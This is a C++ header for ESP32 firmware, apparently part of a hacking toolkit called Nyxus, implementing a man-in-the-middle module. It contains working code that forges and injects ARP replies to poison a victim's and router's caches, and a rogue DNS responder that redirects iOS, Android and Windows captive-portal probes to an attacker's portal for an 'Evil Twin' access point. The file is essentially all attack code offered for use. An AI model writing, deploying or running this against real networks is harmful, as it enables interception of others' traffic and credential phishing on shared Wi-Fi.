/**
*     _  _         _____                     _______  _ 
*    ( )( (    /| / ___ \ |\     /||\     /|(  ____ \( )
*    | ||  \  ( |( (   ) )( \   / )| )   ( || (    \/| |
*    (_)|   \ | |( (___) | \ (_) / | |   | || (_____ (_)
*     _ | (\ \) | \____  |  ) _ (  | |   | |(_____  ) _ 
*    ( )| | \   |      ) | / ( ) \ | |   | |      ) |( )
*    | || )  \  |/\____) )( /   \ )| (___) |/\____) || |
*    (_)|/    )_)\______/ |/     \|(_______)\_______)(_)
*                                                       
*/
/*  
*  Nyxus Source-Available Non-Derivative License
*  Copyright (c) 2026 Yazdan Samari
*  Permission is hereby granted, free of charge, to any person obtaining a copy
*  of this software and associated documentation files (the "Software"), to use
*  and compile the Software for personal or internal purposes, subject to the 
*  following conditions:
*  1. NO MODIFICATION: You may not modify, alter, translate, or create derivative 
*     works of the Software.
*  2. NO REDISTRIBUTION OF MODIFIED COPIES: You may not publish, distribute, 
*     sublicense, or sell modified versions of the Software.
*  3. ATTRIBUTION: The above copyright notice and this permission notice shall be 
*     included in all copies or substantial portions of the Software.
*  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
*  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
*  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
*  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
*  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
*  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
*  SOFTWARE.
*/
#pragma once
#ifndef _NYXUS_MITM_HPP_
#define _NYXUS_MITM_HPP_

#include <Arduino.h>
#include <esp_wifi.h>
#include <lwip/inet.h>
#include <lwip/sockets.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <Nyxus/nyx_terminal_graphics.hpp>
#include <Nyxus/nyx_network_types.hpp>
#include <RTClib.h>

extern RTC_DS3231 rtc;

// The Undocumented ESP-IDF C-Bridge: Allows injecting raw Ethernet frames directly into the hardware encryption pipeline
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);

class NYXUS_MITM {
   private:
   /** 
   * @brief Handle for the FreeRTOS background task sustaining the poisoned ARP cache.
   */
   TaskHandle_t arp_task_handle = nullptr;

   private:
   /** 
   * @brief Handle for the FreeRTOS background task managing the Rogue DNS server.
   */
   TaskHandle_t dns_task_handle = nullptr;

   private:
   /** 
   * @brief Target machine's IPv4 address.
   */
   uint32_t target_ip;

   private:
   /** 
   * @brief Network router's IPv4 address.
   */
   uint32_t router_ip;

   private:
   /** 
   * @brief The injected IP address representing the Captive Portal.
   */
   uint32_t captive_ip_addr;

   private:
   /** 
   * @brief LwIP baremetal UDP socket bound to Port 53.
   */
   int32_t dns_sock = -1;

   private:
   /** 
   * @brief  The MAC address of the ESP32 hardware interface.
   */
   uint8_t  host_mac[6] = {0};

   private:
   /** 
   * @brief Target machine's physical MAC address.
   */
   uint8_t  target_mac[6] = {0};

   private:
   /** 
   * @brief Network router's physical MAC address.
   */
   uint8_t  router_mac[6] = {0};

   private:
   /**
   * @brief Thread-safe execution flag for the ARP task.
   */
   volatile bool arp_active = false;

   private:
   /**
   * @brief Thread-safe execution flag for the DNS task.
   */
   volatile bool dns_active = false;

   protected:
   /** 
   * @brief Enables verbosity.
   */
   bool verbose;

   protected:
   /** 
   * @brief Enables Timestamping.
   */
   bool timestampEnabled;

   public:
   /**
   * @brief Instantiates the Man-in-the-Middle command module.
   */
   NYXUS_MITM(bool toggleVerbosity = true, bool timestamp = true): verbose(toggleVerbosity), timestampEnabled(timestamp) {}

   private:
   /**
   * @brief prints the timestamp in 24 Hour format if timestamping is enabled.
   * @return void
   */
   inline void timestamp();

   private:
   /**
   * @brief Converts a human-readable MAC string ("AA:BB:CC:DD:EE:FF") into a 6-byte hardware array.
   */
inline void  parse_mac(const char* mac_str, uint8_t* mac_array);

   private:
   /**
   * @brief Crafts and encrypts a malicious Layer 2.5 ARP Reply.
   */
inline void  ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip);

   private:
   /**
   * @brief Continuous FreeRTOS background task for sustaining the poisoned ARP cache.
   */
   static void arp_poison_task(void* arg);

   public:
   /**
   * @brief Ignites a dual-threaded Man-in-the-Middle ARP Cache Poisoning attack.
   * @param victimIP Target machine IPv4.
   * @param victimMAC Target machine MAC.
   * @param gatewayIP Network router IPv4.
   * @param gatewayMAC Network router MAC.
   */
inline void  StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC);

   public:
   /**
   * @brief Stops the dual-threaded Man-in-the-Middle ARP Cache Poisoning attack.
   */
inline void  StopArpSpoof();

   private:
   /**
   * @brief Asynchronous baremetal UDP socket loop for overriding DNS inquiries.
   * @paragraph Omnidirectional Spoofing
   * Binds to the universal DNS Port (53). When a victim connects to the Rogue AP and tries 
   * to access "apple.com", this engine captures the UDP packet, flips the DNS flags to `0x8180` 
   * (Standard Response), appends a compressed Answer Block pointing to the Captive Portal IP, 
   * and bounces it back in less than a millisecond.
   */
   static void dns_spoof_task(void* arg);

   public:
   /**
   * @brief Deploys the Evil Twin DNS interceptor engine.
   * @param captive_portal_ip The IPv4 address of your ESP32's web server (e.g. "192.168.4.1")
   * @attention Must be called after `NYXUS_WIFI::ChangeMode(WifiMode::assertive)`.
   */
inline void  StartEvilTwin(const std::string& captive_portal_ip);

   public:
   /**
   * @brief Stops the Evil Twin DNS interceptor engine.
   */
inline void  StopEvilTwin();
};

/* IMPLEMENTATIONS - NOTHING HERE */

inline void NYXUS_MITM::timestamp(){
   if (!timestampEnabled) return;
   DateTime now = rtc.now();
   Serial.printf("[%s%d-%d-%d %d:%d:%d%s] ", Color::CYAN, now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second(), Color::RESET);
}

inline void  NYXUS_MITM::parse_mac(const char* mac_str, uint8_t* mac_array) {
   sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac_array[0], &mac_array[1], &mac_array[2], &mac_array[3], &mac_array[4], &mac_array[5]);
}

inline void  NYXUS_MITM::ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip) {
   uint8_t frame[sizeof(MITM::ethernet_header) + sizeof(MITM::arp_header)] = {0};
   MITM::ethernet_header* eth = (MITM::ethernet_header*)frame;
   MITM::arp_header* arp = (MITM::arp_header*)(frame + sizeof(MITM::ethernet_header));
   memcpy(eth->dest_mac, dest_mac, 6);
   memcpy(eth->src_mac, host_mac, 6); 
   eth->ethertype = htons(0x0806);    
   arp->hardware_type = htons(1);     
   arp->protocol_type = htons(0x0800);
   arp->hardware_size = 6;
   arp->protocol_size = 4;
   arp->opcode = htons(2);            
   memcpy(arp->sender_mac, spoofed_mac, 6);
   arp->sender_ip = spoofed_ip;
   memcpy(arp->target_mac, dest_mac, 6);
   arp->target_ip = target_ip;
   esp_wifi_internal_tx(WIFI_IF_STA, frame, sizeof(frame));
}

inline void  NYXUS_MITM::arp_poison_task(void* arg) {
   NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
   bool first_run = true;
   while(mitm->arp_active) {
      if (first_run) {
         for(int i = 0; i < 5 && mitm->arp_active; i++) {
            mitm->ForgeAndInjectARP(mitm->target_mac, mitm->host_mac, mitm->router_ip, mitm->target_ip);
            mitm->ForgeAndInjectARP(mitm->router_mac, mitm->host_mac, mitm->target_ip, mitm->router_ip);
            vTaskDelay(pdMS_TO_TICKS(50));
         }
         first_run = false;
      }
      else {
         mitm->ForgeAndInjectARP(mitm->target_mac, mitm->host_mac, mitm->router_ip, mitm->target_ip);
         mitm->ForgeAndInjectARP(mitm->router_mac, mitm->host_mac, mitm->target_ip, mitm->router_ip);
      }
      for (int i = 0; i < 3000 && mitm->arp_active; i++) vTaskDelay(pdMS_TO_TICKS(10));
   }
   mitm->arp_task_handle = nullptr;
   vTaskDelete(NULL);
}

inline void  NYXUS_MITM::StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC) {
   if (arp_task_handle != nullptr) return;
   esp_wifi_get_mac(WIFI_IF_STA, host_mac);
   parse_mac(victimMAC.c_str(), target_mac);
   parse_mac(gatewayMAC.c_str(), router_mac);
   inet_pton(AF_INET, victimIP.c_str(), &target_ip);
   inet_pton(AF_INET, gatewayIP.c_str(), &router_ip);
   if (verbose) {
      Serial.println("===============================");
      timestamp(); Serial.printf("[%sMITM%s] Igniting Dual-Vector ARP Cache Poisoning...\n", Color::MAGENTA, Color::RESET);
      timestamp(); Serial.printf("[%sTARGET%s] Forcing %s traffic to route through ESP32.\n", Color::YELLOW, Color::RESET, victimIP.c_str());
   }
   arp_active = true;
   xTaskCreatePinnedToCore(arp_poison_task, "ARP_Spoof", 3072, this, 1, &arp_task_handle, 1);
}

inline void  NYXUS_MITM::StopArpSpoof() {
   if (arp_active) {
      arp_active = false;
      while(arp_task_handle != nullptr) vTaskDelay(pdMS_TO_TICKS(10));
      if (verbose) {
         timestamp(); Serial.printf("[%sSUCCESS%s] ARP Spoofing terminated. Network restoring...\n", Color::GREEN, Color::RESET);
         Serial.println("===============================");
      }
   }
}

inline void  NYXUS_MITM::dns_spoof_task(void* arg) {
   NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
   mitm->dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
   struct sockaddr_in server_addr = {0};
   server_addr.sin_family = AF_INET;
   server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
   server_addr.sin_port = htons(53); // Standard DNS Port
   bind(mitm->dns_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
   char rx_buffer[1024]; // 1KB Buffer (Safe cuz standard UDP DNS rarely exceeds 512 bytes)
   struct sockaddr_in source_addr;
   socklen_t socklen = sizeof(source_addr);
   while(mitm->dns_active) {
      int len = recvfrom(mitm->dns_sock, rx_buffer, sizeof(rx_buffer) - sizeof(MITM::dns_answer_trailer), MSG_DONTWAIT, (struct sockaddr*)&source_addr, &socklen);
      if (len > 0 && (len + sizeof(MITM::dns_answer_trailer)) <= sizeof(rx_buffer)) {
         MITM::dns_header* dns = (MITM::dns_header*)rx_buffer;
         if ((ntohs(dns->flags) & 0x8000) == 0) {
            // The query name string starts directly after the 12-byte DNS header
            char* query_name = rx_buffer + sizeof(MITM::dns_header);
            // We search the raw bytes for known Captive Portal probe domains.
            // "apple" catches captive.apple.com (iOS / macOS)
            // "gstatic" catches connectivitycheck.gstatic.com (Android / ChromeOS)
            // "msft" catches msftconnecttest.com (Windows)
            // "portal" catches custom local queries
            if (strstr(query_name, "apple") != NULL || strstr(query_name, "gstatic") != NULL || strstr(query_name, "msft") != NULL || strstr(query_name, "portal") != NULL) {
               dns->flags = htons(0x8180);
               dns->ancount = htons(1);
               MITM::dns_answer_trailer* answer = (MITM::dns_answer_trailer*)(rx_buffer + len);
               answer->name_ptr = htons(0xC00C);
               answer->type = htons(0x0001);
               answer->cls = htons(0x0001);
               answer->ttl = htonl(60);
               answer->data_len = htons(4);
               answer->ip_addr = mitm->captive_ip_addr;
               sendto(mitm->dns_sock, rx_buffer, len + sizeof(MITM::dns_answer_trailer), 0, (struct sockaddr*)&source_addr, sizeof(source_addr));
            }
         }
      }
      vTaskDelay(pdMS_TO_TICKS(10)); 
   }
   if (mitm->dns_sock >= 0) {
      close(mitm->dns_sock);
      mitm->dns_sock = -1;
   }
   mitm->dns_task_handle = nullptr;
   vTaskDelete(NULL);
}

inline void  NYXUS_MITM::StartEvilTwin(const std::string& captive_portal_ip) {
   if (dns_task_handle != nullptr) return;
   inet_pton(AF_INET, captive_portal_ip.c_str(), &captive_ip_addr);
   if (verbose) {
      Serial.println("===============================");
      timestamp(); Serial.printf("[%sEVIL TWIN%s] Igniting Rogue DNS Server...\n", Color::MAGENTA, Color::RESET);
      timestamp(); Serial.printf("[%sDNS%s] Force-routing all HTTP traffic to %s\n", Color::YELLOW, Color::RESET, captive_portal_ip.c_str());
   }
   
   dns_active = true;
   xTaskCreatePinnedToCore(dns_spoof_task, "DNS_Spoofer", 4096, this, 1, &dns_task_handle, 1);
}

inline void  NYXUS_MITM::StopEvilTwin() {
   if (dns_active) {
      dns_active = false;
      while(dns_task_handle != nullptr) vTaskDelay(pdMS_TO_TICKS(10));
      if (verbose) {
         timestamp(); Serial.printf("[%sSUCCESS%s] Rogue DNS Server offline.\n", Color::GREEN, Color::RESET);
         Serial.println("===============================");
      }
   }
}
#endif